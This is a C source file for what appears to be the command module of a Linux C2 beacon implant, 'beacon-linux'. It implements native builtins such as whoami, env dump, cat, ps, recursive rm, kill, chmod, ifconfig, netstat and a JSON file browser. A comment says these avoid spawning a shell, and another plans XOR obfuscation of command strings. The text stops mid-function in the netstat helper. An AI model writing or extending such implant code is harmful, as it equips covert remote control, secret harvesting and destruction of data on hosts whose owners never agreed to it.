/*
 * builtin.c — native builtins for beacon-linux (no /bin/sh spawning)
 */

#define _GNU_SOURCE

/*
 *
 * All 21 builtins + dispatch.  Each builtin writes output into the caller-
 * supplied out_buf and returns the number of bytes written (not including the
 * terminating NUL).
 *
 * String comparisons currently use strcmp/strncmp.
 * XOR: replace with xor_eq / xor_prefix once ENC_CMD_* constants exist.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <errno.h>
#include <pwd.h>
#include <grp.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <ifaddrs.h>
#include <fcntl.h>
#include <signal.h>
#include <ftw.h>
#include <time.h>

#include "builtin.h"
#include "beacon.h"

/* -------------------------------------------------------------------------
 * Internal helpers
 * ---------------------------------------------------------------------- */

/* Append printf-formatted text into buf at position pos; return new pos. */
static int out_append(char *buf, int buf_size, int pos, const char *fmt, ...) {
    if (pos < 0 || pos >= buf_size - 1) return (buf_size > 0 ? buf_size - 1 : 0);
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf + pos, (size_t)(buf_size - pos), fmt, ap);
    va_end(ap);
    if (n < 0) return pos;
    int new_pos = pos + n;
    if (new_pos >= buf_size) new_pos = buf_size - 1;
    buf[new_pos] = '\0';
    return new_pos;
}

/* Skip leading whitespace from a string. */
static const char *ltrim(const char *s) {
    while (*s == ' ' || *s == '\t') s++;
    return s;
}

/* Permission string helper — fills exactly 9 chars + NUL into perm[10]. */
static void mode_to_str(mode_t m, char perm[10]) {
    perm[0] = (m & S_IRUSR) ? 'r' : '-';
    perm[1] = (m & S_IWUSR) ? 'w' : '-';
    perm[2] = (m & S_IXUSR) ? 'x' : '-';
    perm[3] = (m & S_IRGRP) ? 'r' : '-';
    perm[4] = (m & S_IWGRP) ? 'w' : '-';
    perm[5] = (m & S_IXGRP) ? 'x' : '-';
    perm[6] = (m & S_IROTH) ? 'r' : '-';
    perm[7] = (m & S_IWOTH) ? 'w' : '-';
    perm[8] = (m & S_IXOTH) ? 'x' : '-';
    perm[9] = '\0';
}

/* Read a single small text file into dst (at most max-1 bytes), NUL-terminate. */
static int read_small_file(const char *path, char *dst, int max) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, dst, (size_t)(max - 1));
    close(fd);
    if (n < 0) return -1;
    dst[n] = '\0';
    /* strip trailing newline */
    if (n > 0 && dst[n - 1] == '\n') dst[n - 1] = '\0';
    return (int)n;
}

/* -------------------------------------------------------------------------
 * 1. builtin_whoami  (also handles "id")
 * ---------------------------------------------------------------------- */
static int builtin_whoami(char *buf, int buf_size) {
    int pos = 0;
    uid_t  uid  = getuid();
    uid_t  euid = geteuid();
    gid_t  gid  = getgid();
    gid_t  egid = getegid();

    struct passwd *pw = getpwuid(uid);
    const char *uname = pw ? pw->pw_name : "?";

    struct group *gr = getgrgid(gid);
    const char *gname = gr ? gr->gr_name : "?";

    pos = out_append(buf, buf_size, pos, "uid=%d(%s) gid=%d(%s)",
                     (int)uid, uname, (int)gid, gname);

    if (euid != uid) {
        struct passwd *epw = getpwuid(euid);
        pos = out_append(buf, buf_size, pos, " euid=%d(%s)",
                         (int)euid, epw ? epw->pw_name : "?");
    }
    if (egid != gid) {
        struct group *egr = getgrgid(egid);
        pos = out_append(buf, buf_size, pos, " egid=%d(%s)",
                         (int)egid, egr ? egr->gr_name : "?");
    }

    /* supplementary groups */
    int ngroups = getgroups(0, NULL);
    if (ngroups > 0) {
        gid_t *groups = malloc((size_t)ngroups * sizeof(gid_t));
        if (groups) {
            ngroups = getgroups(ngroups, groups);
            pos = out_append(buf, buf_size, pos, " groups=");
            for (int i = 0; i < ngroups; i++) {
                struct group *sg = getgrgid(groups[i]);
                if (i > 0) pos = out_append(buf, buf_size, pos, ",");
                pos = out_append(buf, buf_size, pos, "%d(%s)",
                                 (int)groups[i], sg ? sg->gr_name : "?");
            }
            free(groups);
        }
    }

    pos = out_append(buf, buf_size, pos, "\n");
    return pos;
}

/* -------------------------------------------------------------------------
 * 2. builtin_hostname
 * ---------------------------------------------------------------------- */
static int builtin_hostname(char *buf, int buf_size) {
    int pos = 0;
    char hname[256] = {0};
    gethostname(hname, sizeof(hname) - 1);

    struct utsname uts;
    uname(&uts);

    pos = out_append(buf, buf_size, pos, "hostname: %s\n", hname);
    pos = out_append(buf, buf_size, pos, "kernel: %s %s %s\n",
                     uts.sysname, uts.release, uts.machine);
    return pos;
}

/* -------------------------------------------------------------------------
 * 3. builtin_pwd
 * ---------------------------------------------------------------------- */
static int builtin_pwd(char *buf, int buf_size) {
    char cwd[4096];
    if (getcwd(cwd, sizeof(cwd)) == NULL)
        return out_append(buf, buf_size, 0, "getcwd: %s\n", strerror(errno));
    return out_append(buf, buf_size, 0, "%s\n", cwd);
}

/* -------------------------------------------------------------------------
 * 4. builtin_cd
 * ---------------------------------------------------------------------- */
static int builtin_cd(const char *args, char *buf, int buf_size) {
    const char *target = ltrim(args);
    if (*target == '\0') {
        target = getenv("HOME");
        if (!target || *target == '\0') target = "/";
    }
    if (chdir(target) != 0)
        return out_append(buf, buf_size, 0, "cd: %s: %s\n", target, strerror(errno));
    char cwd[4096];
    if (getcwd(cwd, sizeof(cwd)) == NULL)
        return out_append(buf, buf_size, 0, "%s\n", target);
    return out_append(buf, buf_size, 0, "%s\n", cwd);
}

/* -------------------------------------------------------------------------
 * 5. builtin_env
 * ---------------------------------------------------------------------- */
extern char **environ;

static int builtin_env(char *buf, int buf_size) {
    int pos = 0;
    for (char **e = environ; *e != NULL; e++)
        pos = out_append(buf, buf_size, pos, "%s\n", *e);
    return pos;
}

/* -------------------------------------------------------------------------
 * 6. builtin_getenv
 * ---------------------------------------------------------------------- */
static int builtin_getenv(const char *args, char *buf, int buf_size) {
    const char *var = ltrim(args);
    if (*var == '\0')
        return out_append(buf, buf_size, 0, "usage: getenv <VAR>\n");
    const char *val = getenv(var);
    if (!val)
        return out_append(buf, buf_size, 0, "%s: not set\n", var);
    return out_append(buf, buf_size, 0, "%s\n", val);
}

/* -------------------------------------------------------------------------
 * 7. builtin_mkdir
 * ---------------------------------------------------------------------- */
static int builtin_mkdir(const char *args, char *buf, int buf_size) {
    const char *path = ltrim(args);
    if (*path == '\0')
        return out_append(buf, buf_size, 0, "usage: mkdir <path>\n");
    if (mkdir(path, 0755) != 0)
        return out_append(buf, buf_size, 0, "mkdir: %s: %s\n", path, strerror(errno));
    return out_append(buf, buf_size, 0, "created: %s\n", path);
}

/* -------------------------------------------------------------------------
 * 8. builtin_chmod
 * ---------------------------------------------------------------------- */
static int builtin_chmod(const char *args, char *buf, int buf_size) {
    const char *p = ltrim(args);
    if (*p == '\0')
        return out_append(buf, buf_size, 0, "usage: chmod <mode> <path>\n");

    char mode_str[16] = {0};
    int i = 0;
    while (*p && *p != ' ' && i < 15) mode_str[i++] = *p++;
    mode_str[i] = '\0';

    p = ltrim(p);
    if (*p == '\0')
        return out_append(buf, buf_size, 0, "usage: chmod <mode> <path>\n");

    char *end = NULL;
    long mode_val = strtol(mode_str, &end, 8);
    if (!end || *end != '\0' || mode_val < 0 || mode_val > 07777)
        return out_append(buf, buf_size, 0, "chmod: invalid mode '%s'\n", mode_str);

    if (chmod(p, (mode_t)mode_val) != 0)
        return out_append(buf, buf_size, 0, "chmod: %s: %s\n", p, strerror(errno));
    return out_append(buf, buf_size, 0, "chmod: %s -> 0%lo\n", p, mode_val);
}

/* -------------------------------------------------------------------------
 * 9. builtin_kill_cmd
 * ---------------------------------------------------------------------- */
static int builtin_kill_cmd(const char *args, char *buf, int buf_size) {
    const char *p = ltrim(args);
    int sig = SIGTERM;

    if (*p == '-') {
        p++;
        char sig_str[16] = {0};
        int i = 0;
        while (*p && *p != ' ' && i < 15) sig_str[i++] = *p++;
        sig_str[i] = '\0';
        char *end = NULL;
        long sv = strtol(sig_str, &end, 10);
        if (!end || *end != '\0')
            return out_append(buf, buf_size, 0, "kill: invalid signal '%s'\n", sig_str);
        sig = (int)sv;
        p = ltrim(p);
    }

    if (*p == '\0')
        return out_append(buf, buf_size, 0, "usage: kill [-<sig>] <pid>\n");

    char *end = NULL;
    long pid_val = strtol(p, &end, 10);
    if (!end || (*end != '\0' && *end != '\n'))
        return out_append(buf, buf_size, 0, "kill: invalid pid '%s'\n", p);

    if (kill((pid_t)pid_val, sig) != 0) {
        if (errno == EPERM)
            return out_append(buf, buf_size, 0, "kill: %d: permission denied\n", (int)pid_val);
        if (errno == ESRCH)
            return out_append(buf, buf_size, 0, "kill: %d: no such process\n", (int)pid_val);
        return out_append(buf, buf_size, 0, "kill: %d: %s\n", (int)pid_val, strerror(errno));
    }
    return out_append(buf, buf_size, 0, "killed PID %d with signal %d\n", (int)pid_val, sig);
}

/* -------------------------------------------------------------------------
 * 10. builtin_ps
 * ---------------------------------------------------------------------- */

typedef struct {
    int  pid;
    int  ppid;
    char state;
    char comm[256];
    char cmdline[64];
    char user[32];
} ProcEntry;

/* Compare for qsort by PID */
static int proc_cmp(const void *a, const void *b) {
    return ((ProcEntry *)a)->pid - ((ProcEntry *)b)->pid;
}

static int builtin_ps(char *buf, int buf_size) {
    int pos = 0;
    int count = 0;
    int cap = 256;
    ProcEntry *procs = malloc((size_t)cap * sizeof(ProcEntry));
    if (!procs) return out_append(buf, buf_size, 0, "ps: malloc failed\n");

    DIR *proc_dir = opendir("/proc");
    if (!proc_dir) {
        free(procs);
        return out_append(buf, buf_size, 0, "ps: cannot open /proc: %s\n", strerror(errno));
    }

    struct dirent *de;
    while ((de = readdir(proc_dir)) != NULL) {
        /* only numeric entries are PID directories */
        if (de->d_name[0] < '1' || de->d_name[0] > '9') continue;
        char *end_p = NULL;
        long pid_num = strtol(de->d_name, &end_p, 10);
        if (!end_p || *end_p != '\0') continue;

        ProcEntry e;
        memset(&e, 0, sizeof(e));
        e.pid = (int)pid_num;

        /* /proc/<pid>/stat */
        char path[128];
        snprintf(path, sizeof(path), "/proc/%d/stat", e.pid);
        char stat_buf[512];
        if (read_small_file(path, stat_buf, sizeof(stat_buf)) > 0) {
            /* format: pid (comm) state ppid ... */
            char *lp = strchr(stat_buf, '(');
            char *rp = strrchr(stat_buf, ')');
            if (lp && rp && rp > lp) {
                int clen = (int)(rp - lp - 1);
                if (clen >= (int)sizeof(e.comm)) clen = (int)sizeof(e.comm) - 1;
                memcpy(e.comm, lp + 1, (size_t)clen);
                e.comm[clen] = '\0';
                /* after ')': ' state ppid ...' */
                if (*(rp + 1) == ' ') {
                    sscanf(rp + 2, "%c %d", &e.state, &e.ppid);
                }
            }
        }

        /* /proc/<pid>/status — grab real uid */
        snprintf(path, sizeof(path), "/proc/%d/status", e.pid);
        {
            int fd = open(path, O_RDONLY);
            if (fd >= 0) {
                char sbuf[2048];
                ssize_t n = read(fd, sbuf, sizeof(sbuf) - 1);
                close(fd);
                if (n > 0) {
                    sbuf[n] = '\0';
                    char *uid_line = strstr(sbuf, "\nUid:");
                    if (!uid_line) uid_line = strstr(sbuf, "Uid:");
                    if (uid_line) {
                        /* skip "Uid:\t" */
                        uid_line = strchr(uid_line, ':');
                        if (uid_line) {
                            uid_line++;
                            while (*uid_line == ' ' || *uid_line == '\t') uid_line++;
                            long ruid = strtol(uid_line, NULL, 10);
                            struct passwd *pw = getpwuid((uid_t)ruid);
                            if (pw) {
                                strncpy(e.user, pw->pw_name, sizeof(e.user) - 1);
                            } else {
                                snprintf(e.user, sizeof(e.user), "%ld", ruid);
                            }
                        }
                    }
                }
            }
        }
        if (e.user[0] == '\0') strncpy(e.user, "?", sizeof(e.user) - 1);

        /* /proc/<pid>/cmdline — replace NULs with spaces, truncate at 60 */
        snprintf(path, sizeof(path), "/proc/%d/cmdline", e.pid);
        {
            int fd = open(path, O_RDONLY);
            if (fd >= 0) {
                char cbuf[64];
                ssize_t n = read(fd, cbuf, sizeof(cbuf) - 1);
                close(fd);
                if (n > 0) {
                    cbuf[n] = '\0';
                    for (ssize_t k = 0; k < n - 1; k++)
                        if (cbuf[k] == '\0') cbuf[k] = ' ';
                    strncpy(e.cmdline, cbuf, sizeof(e.cmdline) - 1);
                    e.cmdline[sizeof(e.cmdline) - 1] = '\0';
                }
            }
        }
        if (e.cmdline[0] == '\0') {
            snprintf(e.cmdline, sizeof(e.cmdline), "[%s]", e.comm);
        }
        if (e.state == '\0') e.state = '?';

        if (count >= cap) {
            cap *= 2;
            ProcEntry *np = realloc(procs, (size_t)cap * sizeof(ProcEntry));
            if (!np) break;
            procs = np;
        }
        procs[count++] = e;
    }
    closedir(proc_dir);

    qsort(procs, (size_t)count, sizeof(ProcEntry), proc_cmp);

    pos = out_append(buf, buf_size, pos,
        "%6s  %6s  %-14s %-6s %s\n", "PID", "PPID", "USER", "STATE", "COMMAND");
    for (int i = 0; i < count; i++) {
        char st[2] = { procs[i].state, '\0' };
        pos = out_append(buf, buf_size, pos,
            "%6d  %6d  %-14s %-6s %s\n",
            procs[i].pid, procs[i].ppid, procs[i].user, st, procs[i].cmdline);
    }
    free(procs);
    return pos;
}

/* -------------------------------------------------------------------------
 * 11. builtin_ls
 * ---------------------------------------------------------------------- */
static int builtin_ls(const char *args, char *buf, int buf_size) {
    int pos = 0;
    char path[4096];

    const char *target = ltrim(args);
    if (*target == '\0') {
        if (getcwd(path, sizeof(path)) == NULL)
            return out_append(buf, buf_size, 0, "ls: getcwd failed: %s\n", strerror(errno));
    } else {
        strncpy(path, target, sizeof(path) - 1);
        path[sizeof(path) - 1] = '\0';
    }

    DIR *d = opendir(path);
    if (!d)
        return out_append(buf, buf_size, 0, "ls: %s: %s\n", path, strerror(errno));

    struct dirent *de;
    while ((de = readdir(d)) != NULL) {
        if (strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0) continue;

        char full[4096 + 256 + 2];
        snprintf(full, sizeof(full), "%s/%s", path, de->d_name);

        struct stat st;
        if (lstat(full, &st) != 0) continue;

        /* file-type char */
        char type_c;
        switch (st.st_mode & S_IFMT) {
            case S_IFDIR:  type_c = 'd'; break;
            case S_IFLNK:  type_c = 'l'; break;
            case S_IFCHR:  type_c = 'c'; break;
            case S_IFBLK:  type_c = 'b'; break;
            case S_IFIFO:  type_c = 'p'; break;
            case S_IFSOCK: type_c = 's'; break;
            default:       type_c = '-'; break;
        }

        char perm[10];
        mode_to_str(st.st_mode, perm);

        const char *owner = "?";
        const char *group = "?";
        struct passwd *pw = getpwuid(st.st_uid);
        if (pw) owner = pw->pw_name;
        struct group  *gr = getgrgid(st.st_gid);
        if (gr) group = gr->gr_name;

        char mtime_str[20];
        struct tm tm_info;
        localtime_r(&st.st_mtime, &tm_info);
        strftime(mtime_str, sizeof(mtime_str), "%Y-%m-%d %H:%M", &tm_info);

        if (S_ISLNK(st.st_mode)) {
            char lnk[512] = {0};
            ssize_t lr = readlink(full, lnk, sizeof(lnk) - 1);
            if (lr < 0) strncpy(lnk, "?", sizeof(lnk) - 1);
            else lnk[lr] = '\0';
            pos = out_append(buf, buf_size, pos,
                "%c%s  %-10s %-10s %8lld  %s  %s -> %s\n",
                type_c, perm, owner, group,
                (long long)st.st_size, mtime_str, de->d_name, lnk);
        } else {
            pos = out_append(buf, buf_size, pos,
                "%c%s  %-10s %-10s %8lld  %s  %s\n",
                type_c, perm, owner, group,
                (long long)st.st_size, mtime_str, de->d_name);
        }
    }
    closedir(d);
    return pos;
}

/* -------------------------------------------------------------------------
 * 11b. builtin_filebrowser — JSON directory listing for file browser UI
 * ---------------------------------------------------------------------- */

/* Append a JSON-escaped version of src into buf at pos. */
static int json_escape_append(char *buf, int buf_size, int pos, const char *src) {
    for (; *src && pos < buf_size - 2; src++) {
        switch (*src) {
            case '"':  pos = out_append(buf, buf_size, pos, "\\\""); break;
            case '\\': pos = out_append(buf, buf_size, pos, "\\\\"); break;
            case '\n': pos = out_append(buf, buf_size, pos, "\\n");  break;
            case '\r': pos = out_append(buf, buf_size, pos, "\\r");  break;
            case '\t': pos = out_append(buf, buf_size, pos, "\\t");  break;
            default:
                if ((unsigned char)*src < 0x20)
                    pos = out_append(buf, buf_size, pos, "\\u%04x", (unsigned)*src);
                else
                    pos = out_append(buf, buf_size, pos, "%c", *src);
                break;
        }
    }
    return pos;
}

static int builtin_filebrowser(const char *args, char *buf, int buf_size) {
    int pos = 0;
    char path[4096];

    const char *target = ltrim(args);
    if (*target == '\0') {
        if (getcwd(path, sizeof(path)) == NULL)
            return out_append(buf, buf_size, 0,
                "[{\"error\":\"getcwd failed: %s\"}]", strerror(errno));
    } else {
        strncpy(path, target, sizeof(path) - 1);
        path[sizeof(path) - 1] = '\0';
    }

    DIR *d = opendir(path);
    if (!d)
        return out_append(buf, buf_size, 0,
            "[{\"error\":\"%s: %s\"}]", path, strerror(errno));

    pos = out_append(buf, buf_size, pos, "[");
    int first = 1;
    struct dirent *de;

    while ((de = readdir(d)) != NULL) {
        if (strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0)
            continue;

        char full[4096 + 256 + 2];
        snprintf(full, sizeof(full), "%s/%s", path, de->d_name);

        struct stat st;
        if (lstat(full, &st) != 0) continue;

        /* file-type string */
        const char *type_str;
        char type_c;
        switch (st.st_mode & S_IFMT) {
            case S_IFDIR:  type_str = "dir";    type_c = 'd'; break;
            case S_IFLNK:  type_str = "link";   type_c = 'l'; break;
            case S_IFCHR:  type_str = "char";   type_c = 'c'; break;
            case S_IFBLK:  type_str = "block";  type_c = 'b'; break;
            case S_IFIFO:  type_str = "pipe";   type_c = 'p'; break;
            case S_IFSOCK: type_str = "socket"; type_c = 's'; break;
            default:       type_str = "file";   type_c = '-'; break;
        }

        char perm[10];
        mode_to_str(st.st_mode, perm);

        const char *owner = "?";
        const char *group = "?";
        struct passwd *pw = getpwuid(st.st_uid);
        if (pw) owner = pw->pw_name;
        struct group  *gr = getgrgid(st.st_gid);
        if (gr) group = gr->gr_name;

        char mtime_str[24];
        struct tm tm_info;
        localtime_r(&st.st_mtime, &tm_info);
        strftime(mtime_str, sizeof(mtime_str), "%Y-%m-%dT%H:%M:%S", &tm_info);

        if (!first) pos = out_append(buf, buf_size, pos, ",");
        first = 0;

        /* open object with escaped name */
        pos = out_append(buf, buf_size, pos, "{\"name\":\"");
        pos = json_escape_append(buf, buf_size, pos, de->d_name);
        pos = out_append(buf, buf_size, pos,
            "\",\"type\":\"%s\",\"perms\":\"%c%s\","
            "\"owner\":\"%s\",\"group\":\"%s\","
            "\"size\":%lld,\"mtime\":\"%s\"",
            type_str, type_c, perm, owner, group,
            (long long)st.st_size, mtime_str);

        /* symlink target */
        if (S_ISLNK(st.st_mode)) {
            char lnk[512] = {0};
            ssize_t lr = readlink(full, lnk, sizeof(lnk) - 1);
            if (lr >= 0) lnk[lr] = '\0';
            else          strncpy(lnk, "?", sizeof(lnk) - 1);
            pos = out_append(buf, buf_size, pos, ",\"target\":\"");
            pos = json_escape_append(buf, buf_size, pos, lnk);
            pos = out_append(buf, buf_size, pos, "\"");
        }

        pos = out_append(buf, buf_size, pos, "}");
    }
    closedir(d);
    pos = out_append(buf, buf_size, pos, "]");
    return pos;
}

/* -------------------------------------------------------------------------
 * 12. builtin_cat
 * ---------------------------------------------------------------------- */
static int builtin_cat(const char *args, char *buf, int buf_size) {
    const char *path = ltrim(args);
    if (*path == '\0')
        return out_append(buf, buf_size, 0, "usage: cat <file>\n");

    int fd = open(path, O_RDONLY);
    if (fd < 0)
        return out_append(buf, buf_size, 0, "cat: %s: %s\n", path, strerror(errno));

    struct stat st;
    if (fstat(fd, &st) == 0 && st.st_size > 1048576) {
        close(fd);
        return out_append(buf, buf_size, 0, "cat: file too large (max 1MB)\n");
    }

    int pos = 0;
    char tmp[4096];
    ssize_t n;
    while ((n = read(fd, tmp, sizeof(tmp))) > 0) {
        int avail = buf_size - pos - 1;
        if (avail <= 0) break;
        int copy = (n > (ssize_t)avail) ? avail : (int)n;
        memcpy(buf + pos, tmp, (size_t)copy);
        pos += copy;
        buf[pos] = '\0';
    }
    close(fd);
    return pos;
}

/* -------------------------------------------------------------------------
 * 13. builtin_rm
 * ---------------------------------------------------------------------- */

/* nftw callback state — single global is fine since operations are sequential */
static int g_rm_errors = 0;

static int rm_callback(const char *fpath, const struct stat *sb,
                        int typeflag, struct FTW *ftwbuf) {
    (void)sb; (void)ftwbuf;
    int r;
    if (typeflag == FTW_DP || typeflag == FTW_D)
        r = rmdir(fpath);
    else
        r = unlink(fpath);
    if (r != 0) g_rm_errors++;
    return 0; /* continue */
}

static int builtin_rm(const char *args, char *buf, int buf_size) {
    const char *p = ltrim(args);
    int recursive = 0;

    if (strncmp(p, "-rf ", 4) == 0 || strncmp(p, "-fr ", 4) == 0) {
        recursive = 1; p = ltrim(p + 4);
    } else if (strncmp(p, "-r ", 3) == 0) {
        recursive = 1; p = ltrim(p + 3);
    } else if (strcmp(p, "-r") == 0 || strcmp(p, "-rf") == 0 || strcmp(p, "-fr") == 0) {
        return out_append(buf, buf_size, 0, "usage: rm [-r|-rf] <path>\n");
    }

    if (*p == '\0')
        return out_append(buf, buf_size, 0, "usage: rm [-r|-rf] <path>\n");

    struct stat st;
    if (lstat(p, &st) != 0)
        return out_append(buf, buf_size, 0, "rm: %s: %s\n", p, strerror(errno));

    if (S_ISDIR(st.st_mode)) {
        if (!recursive)
            return out_append(buf, buf_size, 0,
                              "rm: %s: is a directory (use -r)\n", p);
        g_rm_errors = 0;
        nftw(p, rm_callback, 64, FTW_DEPTH | FTW_PHYS);
        if (g_rm_errors)
            return out_append(buf, buf_size, 0,
                              "rm: %s: some entries could not be removed\n", p);
    } else {
        if (unlink(p) != 0)
            return out_append(buf, buf_size, 0, "rm: %s: %s\n", p, strerror(errno));
    }
    return out_append(buf, buf_size, 0, "removed: %s\n", p);
}

/* -------------------------------------------------------------------------
 * 14. builtin_cp
 * ---------------------------------------------------------------------- */
static int builtin_cp(const char *args, char *buf, int buf_size) {
    const char *p = ltrim(args);
    if (*p == '\0')
        return out_append(buf, buf_size, 0, "usage: cp <src> <dst>\n");

    /* split on first space */
    const char *sp = strchr(p, ' ');
    if (!sp)
        return out_append(buf, buf_size, 0, "usage: cp <src> <dst>\n");

    char src[4096], dst[4096];
    int slen = (int)(sp - p);
    if (slen >= (int)sizeof(src)) slen = (int)sizeof(src) - 1;
    memcpy(src, p, (size_t)slen); src[slen] = '\0';

    const char *dp = ltrim(sp);
    strncpy(dst, dp, sizeof(dst) - 1); dst[sizeof(dst) - 1] = '\0';
    /* trim trailing newline */
    int dlen = (int)strlen(dst);
    if (dlen > 0 && dst[dlen - 1] == '\n') dst[--dlen] = '\0';

    int src_fd = open(src, O_RDONLY);
    if (src_fd < 0)
        return out_append(buf, buf_size, 0, "cp: %s: %s\n", src, strerror(errno));

    struct stat st;
    if (fstat(src_fd, &st) != 0) {
        close(src_fd);
        return out_append(buf, buf_size, 0, "cp: fstat(%s): %s\n", src, strerror(errno));
    }

    int dst_fd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, st.st_mode & 07777);
    if (dst_fd < 0) {
        close(src_fd);
        return out_append(buf, buf_size, 0, "cp: %s: %s\n", dst, strerror(errno));
    }

    char tbuf[65536];
    ssize_t nr;
    long long total = 0;
    while ((nr = read(src_fd, tbuf, sizeof(tbuf))) > 0) {
        ssize_t nw = write(dst_fd, tbuf, (size_t)nr);
        if (nw != nr) {
            close(src_fd); close(dst_fd);
            return out_append(buf, buf_size, 0, "cp: write error: %s\n", strerror(errno));
        }
        total += nr;
    }
    fchmod(dst_fd, st.st_mode & 07777);
    close(src_fd);
    close(dst_fd);

    return out_append(buf, buf_size, 0, "copied: %s -> %s (%lld bytes)\n", src, dst, total);
}

/* -------------------------------------------------------------------------
 * 15. builtin_mv
 * ---------------------------------------------------------------------- */
static int builtin_mv(const char *args, char *buf, int buf_size) {
    const char *p = ltrim(args);
    if (*p == '\0')
        return out_append(buf, buf_size, 0, "usage: mv <src> <dst>\n");

    const char *sp = strchr(p, ' ');
    if (!sp)
        return out_append(buf, buf_size, 0, "usage: mv <src> <dst>\n");

    char src[4096], dst[4096];
    int slen = (int)(sp - p);
    if (slen >= (int)sizeof(src)) slen = (int)sizeof(src) - 1;
    memcpy(src, p, (size_t)slen); src[slen] = '\0';

    const char *dp = ltrim(sp);
    strncpy(dst, dp, sizeof(dst) - 1); dst[sizeof(dst) - 1] = '\0';
    int dlen = (int)strlen(dst);
    if (dlen > 0 && dst[dlen - 1] == '\n') dst[--dlen] = '\0';

    if (rename(src, dst) == 0)
        return out_append(buf, buf_size, 0, "moved: %s -> %s\n", src, dst);

    if (errno != EXDEV)
        return out_append(buf, buf_size, 0, "mv: %s -> %s: %s\n", src, dst, strerror(errno));

    /* cross-device: copy then unlink */
    char tmp_buf[256];
    int r = builtin_cp(args, tmp_buf, sizeof(tmp_buf));
    (void)r;
    if (strncmp(tmp_buf, "copied:", 7) == 0) {
        unlink(src);
        return out_append(buf, buf_size, 0, "moved: %s -> %s\n", src, dst);
    }
    return out_append(buf, buf_size, 0, "mv: cross-device copy failed: %s\n", tmp_buf);
}

/* -------------------------------------------------------------------------
 * 16. builtin_ifconfig
 * ---------------------------------------------------------------------- */

/* Calculate prefix length from netmask */
static int mask_to_prefix(uint32_t mask) {
    int bits = 0;
    mask = ntohl(mask);
    while (mask & 0x80000000u) { bits++; mask <<= 1; }
    return bits;
}

static int builtin_ifconfig(char *buf, int buf_size) {
    int pos = 0;
    struct ifaddrs *ifap = NULL;
    if (getifaddrs(&ifap) != 0)
        return out_append(buf, buf_size, 0, "ifconfig: getifaddrs: %s\n", strerror(errno));

    /* collect unique interface names */
    char ifaces[64][IFNAMSIZ];
    int nifaces = 0;

    for (struct ifaddrs *ifa = ifap; ifa != NULL; ifa = ifa->ifa_next) {
        if (!ifa->ifa_name) continue;
        int found = 0;
        for (int i = 0; i < nifaces; i++)
            if (strncmp(ifaces[i], ifa->ifa_name, IFNAMSIZ) == 0) { found = 1; break; }
        if (!found && nifaces < 64)
            strncpy(ifaces[nifaces++], ifa->ifa_name, IFNAMSIZ - 1);
    }

    for (int i = 0; i < nifaces; i++) {
        pos = out_append(buf, buf_size, pos, "%s:\n", ifaces[i]);

        /* gather flags from first entry for this iface */
        unsigned int flags = 0;
        for (struct ifaddrs *ifa = ifap; ifa; ifa = ifa->ifa_next) {
            if (ifa->ifa_name && strncmp(ifa->ifa_name, ifaces[i], IFNAMSIZ) == 0) {
                flags = ifa->ifa_flags;
                break;
            }
        }

        for (struct ifaddrs *ifa = ifap; ifa; ifa = ifa->ifa_next) {
            if (!ifa->ifa_name || strncmp(ifa->ifa_name, ifaces[i], IFNAMSIZ) != 0) continue;
            if (!ifa->ifa_addr) continue;

            if (ifa->ifa_addr->sa_family == AF_INET) {
                char ipstr[INET_ADDRSTRLEN];
                struct sockaddr_in *sa = (struct sockaddr_in *)ifa->ifa_addr;
                inet_ntop(AF_INET, &sa->sin_addr, ipstr, sizeof(ipstr));
                int prefix = 0;
                if (ifa->ifa_netmask) {
                    struct sockaddr_in *nm = (struct sockaddr_in *)ifa->ifa_netmask;
                    prefix = mask_to_prefix(nm->sin_addr.s_addr);
                }
                pos = out_append(buf, buf_size, pos, "  inet  %s/%d\n", ipstr, prefix);
            } else if (ifa->ifa_addr->sa_family == AF_INET6) {
                char ipstr[INET6_ADDRSTRLEN];
                struct sockaddr_in6 *sa6 = (struct sockaddr_in6 *)ifa->ifa_addr;
                inet_ntop(AF_INET6, &sa6->sin6_addr, ipstr, sizeof(ipstr));
                /* prefix length for IPv6: count bits in netmask */
                int prefix6 = 0;
                if (ifa->ifa_netmask) {
                    struct sockaddr_in6 *nm6 = (struct sockaddr_in6 *)ifa->ifa_netmask;
                    for (int b = 0; b < 16; b++) {
                        uint8_t byte = nm6->sin6_addr.s6_addr[b];
                        while (byte & 0x80) { prefix6++; byte <<= 1; }
                    }
                }
                pos = out_append(buf, buf_size, pos, "  inet6 %s/%d\n", ipstr, prefix6);
            }
        }

        /* MAC from /sys/class/net/<iface>/address */
        char mac_path[128];
        snprintf(mac_path, sizeof(mac_path), "/sys/class/net/%s/address", ifaces[i]);
        char mac_buf[24] = {0};
        if (read_small_file(mac_path, mac_buf, sizeof(mac_buf)) > 0)
            pos = out_append(buf, buf_size, pos, "  ether %s\n", mac_buf);

        /* flags */
        pos = out_append(buf, buf_size, pos, "  flags:");
        if (flags & IFF_UP)       pos = out_append(buf, buf_size, pos, " UP");
        if (flags & IFF_RUNNING)  pos = out_append(buf, buf_size, pos, " RUNNING");
        if (flags & IFF_LOOPBACK) pos = out_append(buf, buf_size, pos, " LOOPBACK");
        pos = out_append(buf, buf_size, pos, "\n");
    }

    freeifaddrs(ifap);
    return pos;
}

/* -------------------------------------------------------------------------
 * 17. builtin_netstat
 * ---------------------------------------------------------------------- */

static const char *tcp_state_name(int s) {
    switch (s) {
        case 0x01: return "ESTABLISHED";
        case 0x02: return "SYN_SENT";
        case 0x03: return "SYN_RECV";
        case 0x04: return "FIN_WAIT1";
        case 0x05: return "FIN_WAIT2";
        case 0x06: return "TIME_WAIT";
        case 0x07: return "CLOSE";
        case 0x08: return "CLOSE_WAIT";
        case 0x09: return "LAST_ACK";
        case 0x0A: return "LISTEN";
        case 0x0B: return "CLOSING";
        default:   return "UNKNOWN";
    }
}

/* Convert little-endian hex IP (from /proc/net/tcp) to dotted quad. */
static void hex_ip_to_str(const char *hex, char *out) {
    unsigned long val = strtoul(hex, NULL, 16);
    /* /proc/net/tcp stores IPv4 in host byte order (little-endian on x86/arm) */
